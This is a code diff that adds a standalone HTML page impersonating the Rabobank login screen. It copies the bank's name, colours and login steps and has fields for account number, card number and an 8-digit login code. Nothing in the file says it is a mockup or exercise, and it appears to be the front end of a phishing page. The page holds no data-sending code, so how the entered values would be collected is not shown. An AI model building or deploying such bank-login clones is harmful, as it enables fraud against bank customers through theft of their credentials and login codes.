@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Rabobank</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            background-color: white;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #003087;
+        }
+
+        .language {
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .fields {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 50px;
+        }
+
+        .field-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .field-label {
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .field {
+            width: 250px;
+            height: 40px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding-left: 10px;
+            font-size: 16px;
+        }
+
+        .field-with-checkbox {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+        }
+
+        .image-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 30px;
+        }
+
+        .image-container img {
+            width: 256px;
+            height: 256px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .login-section {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .login-btn {
+            width: 100px;
+            height: 40px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            background-color: #ccc;
+            color: white;
+            cursor: not-allowed;
+        }
+
+        .login-msg {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .footer {
+            background-color: #F5F5F5;
+            padding: 20px;
+            margin-top: 50px;
+        }
+
+        .footer-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        .footer-button {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 20px;
+            border: 1px solid #003087;
+            border-radius: 5px;
+            color: #003087;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">Rabobank</div>
+        <div class="header-text">Login</div>
+        <div class="language">NL | EN</div>
+    </header>
+
+    <div class="fields">
+        <div class="field-container">
+            <div class="field-label">Account Number</div>
+            <input type="text" class="field" id="accountNumber" value="NL•• RABO 0" maxlength="18">
+        </div>
+        <div class="field-with-checkbox">
+            <div class="field-container">
+                <div class="field-label">Card Number</div>
+                <input type="text" class="field" id="cardNumber" maxlength="4">
+            </div>
+            <div class="checkbox-container">
+                <input type="checkbox" id="rememberMe">
+                <label for="rememberMe">Remember</label>
+            </div>
+        </div>
+    </div>
+
+    <div class="image-container">
+        <img src="r.png" alt="QR Code">
+    </div>
+
+    <div class="login-section">
+        <input type="text" class="field" id="loginCode" maxlength="8">
+        <button class="login-btn" id="loginBtn">Login</button>
+    </div>
+
+    <div class="login-msg">Please enter your account number and card number.</div>
+
+    <div class="footer">
+        <div class="footer-buttons">
+            <div class="footer-button">
+                <img src="logo.svg" width="20" height="20" alt="QR Code">
+                Login using a QR code and the Rabo App
+            </div>
+            <div class="footer-button">
+                <img src="logo.svg" width="20" height="20" alt="Reader">
+                Login using the Random Reader Comfort
+            </div>
+            <div class="footer-button">
+                <img src="logo.svg" width="20" height="20" alt="Email">
+                Login using email and one-time password
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("cardNumber").addEventListener("input", function() {
+            if (this.value.length === 4) {
+                setTimeout(() => {
+                    document.getElementById("loginCode").focus();
+                }, 2000);
+            }
+        });
+
+        document.getElementById("loginCode").addEventListener("input", function() {
+            const loginBtn = document.getElementById("loginBtn");
+            if (this.value.length === 8) {
+                loginBtn.style.backgroundColor = "#FA6400";
+                loginBtn.style.cursor = "pointer";
+            } else {
+                loginBtn.style.backgroundColor = "#ccc";
+                loginBtn.style.cursor = "not-allowed";
+            }
+        });
+    </script>
+</body>
+</html>
